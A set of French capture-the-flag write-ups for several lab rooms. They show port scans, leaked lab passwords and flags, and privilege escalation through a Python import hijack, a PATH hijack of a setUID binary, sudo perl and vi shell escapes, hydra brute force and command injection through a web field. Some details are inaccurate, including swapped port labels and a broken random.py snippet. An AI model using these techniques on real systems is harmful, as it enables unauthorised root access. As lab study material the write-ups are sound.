# Projet Socat
## WriteUp Room Toss a coin
### Scan NMAP
  Une fois connecté avec le VPN, la première étape consiste en un scan des ports.
  
  ```
  sudo nmap -sV -p-  10.10.254.95
  Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-29 07:34 EDT
  Nmap scan report for 10.10.254.95
  Host is up (0.034s latency).
  Not shown: 65533 closed tcp ports (reset)
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
  80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 38.15 seconds

  ```


  - 80 - SSH : On suppose un accès necessaire mais aucun moyen evident pour le moment.
  - 22 - http : L'IP nous amene sur un site. Son investigation est la première piste privilégiée.

### Dirbuster
  Dirbuster nous permet d'explorer les répertoires "cachés" dans le site internet.
  
  ```
  DirBuster 1.0-RC1 - Report
  http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
  Report produced on Thu May 12 09:57:34 EDT 2022
  --------------------------------
  
  http://10.10.93.150:80
  --------------------------------
  Directories found during testing:
  
  Dirs found with a 200 response:

  /img/
  /
  /t/
  /t/o/
  /t/o/s/
  /t/o/s/s/
  /t/o/s/s/_/
  /t/o/s/s/_/a/
  /t/o/s/s/_/a/_/
  /t/o/s/s/_/a/_/c/
  /t/o/s/s/_/a/_/c/o/
  /t/o/s/s/_/a/_/c/o/i/
  /t/o/s/s/_/a/_/c/o/i/n/

  ```
  
  La suite se devine d'après les lyrics de la chanson:
  
  ```
  http://10.10.190.15/t/o/s/s/_/a/_/c/o/i/n/_/t/o/_/y/o/u/r/_/w/i/t/c/h/e/r/_/o/h/_/v/a/l/l/e/y/_/o/f/_/p/l/e/n/t/y/
  ```
  
  Sur cette nouvelle page, en explorant avec F12 on accède à un mot de passe: 
  
  ```
  jaskier:YouHaveTheMostIncredibleNeckItsLikeASexyGoose
  ```
  
### SSH - Jaskier - user.txt
 La connexion SSH est directe avec l'utilisateur "jaskier" et le mot de passe trouvé.
 
 ```
 jaskier@the-continent:~$ pwd
/home/jaskier
jaskier@the-continent:~$ ls -la
total 40
drwxr-xr-x 5 jaskier jaskier 4096 Jan 18 13:10 .
drwxr-xr-x 6 root    root    4096 Jan 18 13:17 ..
lrwxrwxrwx 1 root    root       9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 jaskier jaskier  220 May 25  2020 .bash_logout
-rw-r--r-- 1 jaskier jaskier 3771 May 25  2020 .bashrc
drwx------ 2 jaskier jaskier 4096 May 25  2020 .cache
drwx------ 3 jaskier jaskier 4096 May 25  2020 .gnupg
drwxrwxr-x 3 jaskier jaskier 4096 May 25  2020 .local
-rw-r--r-- 1 jaskier jaskier  807 May 25  2020 .profile
-rw-r--r-- 1 root    root    1430 Jan 18 13:10 toss-a-coin.py
-rw------- 1 jaskier jaskier   33 Jan 18 13:09 user.txt
jaskier@the-continent:~$ 

 ```
 
 L'accès au user.txt est direct également, nous procurant le flag suivant:
 
 ```
 jaskier@the-continent:~$ cat user.txt 
EPI{R3Sp3C7_D03sNT_M4k3_h1S70rY}

 ```
 
### Accès à Yen
  Depuis Jaskier, on remarque plusieurs choses:
  - un script python "root"
    ```
    -rw-r--r-- 1 root    root    1430 Jan 18 13:10 toss-a-coin.py
    ```
  - d'autres utilisateurs
    ```
    tryhackme:x:1000:1000:tryhackme:/home/tryhackme:/bin/bash
    jaskier:x:1001:1001:Alice Liddell,,,:/home/jaskier:/bin/bash
    yen:x:1002:1002:White Rabbit,,,:/home/yen:/bin/bash
    geralt:x:1003:1003:Mad Hatter,,,:/home/geralt:/bin/bash

    ```
  - des droits sudo particuliers
    ```
    jaskier@the-continent:~$ sudo -l
    [sudo] password for jaskier: 
    Matching Defaults entries for jaskier on the-continent:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User jaskier may run the following commands on the-continent:
    (yen) /usr/bin/python3.6 /home/jaskier/toss-a-coin.py

    ```
    
  - les sudoers
    ```
    ╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
    ╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
    Sudoers file: /etc/sudoers.d/geralt is readable
    geralt ALL = (root) /usr/bin/perl
    Sudoers file: /etc/sudoers.d/jaskier is readable
    jaskier ALL = (yen) /usr/bin/python3.6 /home/jaskier/toss-a-coin.py
    ```
    Le contenu du script python nous apprend un import de librairie:
    ```
    import random
    ```
    
    
    Compte tenu de ces informations, l'accès à Yen est possible en faisant un bypass des privilèges dy script root, en créant un nouveau script "random.py" éxecutant un shell chez Yen.
    
    Le contenu de random.py est le suivant: 
    ```
    import os;
    system.os("/bin/bash");
    ```
    
    et la commande d'éxecution pour l'accès à Yen est la suivante:
    
    ```
    chmod +x random.py //on attribue les droits d'éxecution au script
    sudo -u yen /usr/bin/python3.6 /home/jaskier/toss-a-coin.py
    ```
    
    Aboutissant à la session de yen:
    ```
    yen@the-continent:/home/yen$ ls -la
    total 40
    drwxr-x--- 2 yen  yen   4096 Jan 18 13:19 .
    drwxr-xr-x 6 root root  4096 Jan 18 13:17 ..
    lrwxrwxrwx 1 root root     9 May 25  2020 .bash_history -> /dev/null
    -rw-r--r-- 1 yen  yen    220 May 25  2020 .bash_logout
    -rw-r--r-- 1 yen  yen   3771 May 25  2020 .bashrc
    -rw-r--r-- 1 yen  yen    807 May 25  2020 .profile
    -rwsr-sr-x 1 root root 16872 Jan 18 13:19 portal
    ```

###  Accès à Geralt
Depuis la session de Yen, on observe à nouveau certaines singularités: un fichier "portal", setUID. Ce fichier possède donc les droits root quelque soit l'utilisateur qui l'execute.

L'execution de ce script renvoie ce resultat:

```
yen@the-continent:/home/yen$ ./portal 
I am preparing a portal for you Geralt.
It will be ready in about Thu, 12 May 2022 15:30:30 +0000
You just have to wait for it
```

un cat nous renvoie un contenu difficilement lisible, mais nous informe sur l'utilisation de la fonction systeme "date".

Ainsi de la même manière que précédement, nous avons bypassé les droits en créant un script "date".

```
#!/bin/bash

/bin/bash
```

A ceci près qu'il faut rajouter le dossier du script au PATH afin qu'il remplace la fonction systeme.

```
yen@the-continent:/home/yen$ export PATH="/home/yen/:$PATH"
yen@the-continent:/home/yen$ $PATH
bash: /home/yen/:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin: No such file or directory
yen@the-continent:/home/yen$ 
```

Ainsi son execution renvoie vers Geralt.

```
yen@the-continent:/home/yen$ ./portal 
I am preparing a portal for you Geralt.
It will be ready in about geralt@the-continent:/home/yen$ 
```

### Accès au ROOT

Nous avons vu que Geralt est sudoer avec PERL.
Une simple execution d'un schell en perl suffit donc à acceder aux droits root.
Le mot de passe de Geralt se trouve en clair dans un fichier texte.

```
geralt@the-continent:/home/yen$ cd /home/geralt/
geralt@the-continent:/home/geralt$ ls -la
total 36
drwxr-x--- 5 geralt geralt 4096 Jan 18 13:05 .
drwxr-xr-x 6 root   root   4096 Jan 18 13:17 ..
lrwxrwxrwx 1 root   root      9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 geralt geralt  220 May 25  2020 .bash_logout
-rw-r--r-- 1 geralt geralt 3771 May 25  2020 .bashrc
drwx------ 2 geralt geralt 4096 Jan 18 13:05 .cache
drwx------ 3 geralt geralt 4096 Jan 18 13:05 .gnupg
drwxrwxr-x 3 geralt geralt 4096 May 25  2020 .local
-rw-r--r-- 1 geralt geralt  807 May 25  2020 .profile
-rw------- 1 geralt geralt   13 Jan 18 13:18 password.txt
geralt@the-continent:/home/geralt$ cat password.txt 
IH4teP0rt4ls
geralt@the-continent:/home/geralt$ sudo perl -e 'exec "/bin/bash";'
[sudo] password for geralt: 
root@the-continent:/home/geralt# 
```

Ainsi les droits root nous amènent au flag root .txt:
```
root@the-continent:/root# ls -la
total 36
drwx------  6 root root 4096 Mar  9 08:26 .
drwxr-xr-x 23 root root 4096 Mar  4 11:05 ..
lrwxrwxrwx  1 root root    9 May 25  2020 .bash_history -> /dev/null
-rw-------  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Jan 18 13:12 .cache
drwx------  3 root root 4096 Jan 18 13:12 .gnupg
drwx------  3 root root 4096 May 25  2020 .local
-rw-------  1 root root  148 Aug 17  2015 .profile
drwxr-xr-x  2 root root 4096 Mar  9 08:26 .ssh
-r--------  1 root root   65 Jan 18 13:09 root.txt
root@the-continent:/root# cat root.txt 
EPI{D3s71Ny_1s_Ju5t_Th3_3mB0D1m3Nt_0f_Th3_S0uL_S_D3s1R3_T0_Gr0W}

```

## WriteUP Room Yer a wizard
- Token user.txt
  - Lancement d'un scan des ports avec la commande `nmap -p- -sC <IP>`
  Cette commande nous permet de voir que les ports 22 et 21 sont ouverts.
  On peut également constater qu'il n'y a aucune faille sur le port 22, cependant sur le port 21 il est possible de se connecter en anonymous.

  - Connexion en anonymous à l'aide de la commande `ftp anonymous@<IP>`
  Une fois connecté on constate qu'il y a un fichier **.hidden**, nous téléchargeons ce dernier et nous fouillons son contenu à l'aide de `cat .hidden`.
  Nous faison un essai sur le port 21 avec l'identifiant hagrid qui est présent dans le fichier **.hidden**. Login failed.
  Nous sommes de retour sur le ftp et en fouillant encore on constate qu'il y a un dossier **...** nous explorons ce dernier. 
  Un autre fichier apparait **.reallyHidden** on l'affiche et un nouveau mot de passe nous est donné. Nous réessayons avec ce dernier il est possible de se connecter au ftp.

  - Essai du mot de passe sur le ssh, nous arrivons à nous connecter en ssh en tant qu'hagrid. 
  A la racine du dossier se trouve un user.txt, on le passe sur le site dehasher 3 fois et voici le token user.

- Token root.txt
  Lancement d'un scan linpeas, on constate plusieurs failles: 
    - ron lance le script **hut.sh** au reboot
    - hagrid peut lancer la commande reboot en sudo
    - le dossier home de harry possede les permissions d'executions
  En exploitant les deux premieres failles on recupere le contenu du fichier **dumbledore.txt**.
  Il contient un hash que l'on peut dehasher et on trouve un mot de passe, on le teste sur le ssh et cela fonctionne nous somme maintenant connécté en tant que dumbledore. 
## WriteUp Room le bananier des montagnes
- Token user.txt
  - Lancement d'un scan des ports avec la commande `nmap -p- -sC <IP>`
    On constate la présence d'un site internet sur le port 80, le port 22 est également ouvert mais pas de faille apparente.

  - Lancement d'un scan des routes cachées avec **dirbuster**
    Nous arrivons à trouver une route nommé **l3_B4n4N13r_D3s_M0nT4gN3s**. En se rendant sur cette route on nous demande de desactiver le javascript.
    Une fois ceci fait on réactualise et un texte apparait. Ce texte nous dit que l'indice est dans la vidéo. Cependant aprés plusieurs lectures aucun indice dans la vidéo.
    Par contre en inspectant les requetes avec mozilla on decouvre un code 302 qui pointe sur la page **L3s_Fru1ts_s0nt_c0NNus_Gen3raL3m3nt_s0Us_l3_N0m_D3_B4N4n3**.

  - Nous nous rendons sur la page precedement citée, il s'avère que c'est un dossier contenant une image. 
    Nous decidons de télécharger l'image, cependant cette dernière ne nous donne aucune information. En allant plus loin nous décidon d'analyser l'image.
  - Analyse de l'image avec la commande `binwalk <image>`.
    On constate qu'il y a des fichiers zip dans l'image on les extrait grâce à la commande `binwalk -e <image>`. En analysant le contenu des fichiers on voit un texte nous disant que l'identifiant est banane_celeste et une liste de mot de passe. 
  - Brute force du ftp avec la commande `hydra -l banane_celeste -P <liste_de_mdp> <IP> <service_attaqué>`
    Nous avons un accés au ftp dans lequel on trouve un fichier nommé **Valerian's Cred.txt**. On ouvre ce fichier et il est apparemment crypté.
    En fouillant dans ce fichier on se rend compte que c'est du langage whitespace, on le decrypte et on peut voir apparaitre les identifiants ssh pour l'utilisateur valerian. 
  - Nous nous connectons au ssh et on constate une phrase qui nous dit qu'un secret est caché dans le dossier s3cr3t. On fouille dans ce dossier et on decouvre un fichier qui nous donne un mot de passe. 
  On execute une commande find pour trouvert le token user. Ce dernier se trouve sur le home de l'utilisateur gabriel. 
  - Nous essayons de nous connecter à gabriel avec le mot de passe trouvé précédemment. C'est un succés. on accede au fichier user.txt et voici le token.

- Token root.txt
  - Première étape, on tape la commande `sudo -l`. On se rend compte que la commande vi est exposée on cherche un moyen d'exploiter cette faille.
    Il suffit de lancer vi en sudo et d'éxecuter la commande `:!/bin/bash` puis de lance un whoami, nous sommes bien en root.
    il suffit maintenant de chercher dans **/root** pour trouver un fichier root.txt, ce dernier contient le token root. 
## WriteUp Room Secret Of The Maw
- Token user.txt
  - Première étape, lancement d'un scan avec `nmap -p- -sC -sV <IP>` nous voyons qu'il y a plusieurs ports ouverts :
    - 22 SSH, pas de failles
    - 21 FTP, compte anonymous ouvert
    - 80 Site Web
  - Test du compte ftp anonymous, on constate qu'il y a un fichier **nomes.txt** il contient une phrase qui ne mène nulle part, c'est un rabbit hole.
  - Test du site web avec dirbuster, on trouve une route **discrete**, quand on se rend dessus on trouve un champ de texte dans lequel on peut taper des commandes shell mais pas toute. en tapant la commande `id` on voit que nous somme l'utilisateur **www-data**. Nous tapons ensuite la commande `sudo -l` et nous constatons que nous pouvons lancer le script musicbox dans le repertoire  **/home/six/**. Une fois le script lancé il affiche une phrase qui n'a pas réellement de sens **"note de musique", It entered, It didn't worked**. On décide donc d'afficher le contenu du script avec la commande `(cat /home/six/.musicbox)`. On se rend compte que le script attend une variable **$rep**. On saisit la commande `echo "ls -la /home/six/ | sudo -u /home/six/.musicbox` et on obtient le contenu du dossier six et que nous avons les droits de lecture sur le fichier user.txt, il suffit de saisir la commande `echo "cat /home/six/user.txt" | sudo -u six /home/six/.musicbox` pour obtenir le contenu et le token user.txt.
